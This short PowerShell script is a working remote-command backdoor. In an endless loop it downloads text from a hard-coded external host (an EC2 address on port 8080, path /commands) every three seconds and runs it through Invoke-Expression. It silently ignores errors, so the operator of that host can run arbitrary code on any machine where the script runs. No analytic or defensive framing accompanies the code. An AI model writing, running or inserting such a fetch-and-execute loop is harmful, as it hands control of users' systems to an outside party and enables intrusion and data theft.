$commands_host = "http://ec2-35-156-198-4.eu-central-1.compute.amazonaws.com:8080/commands"
$timeout_time = 3

while ($true) {
	try {
		$response = Invoke-WebRequest -Uri $commands_host
		iex $response.Content
	} catch {
		# Ignore
	}

	Start-Sleep -s $timeout_time
}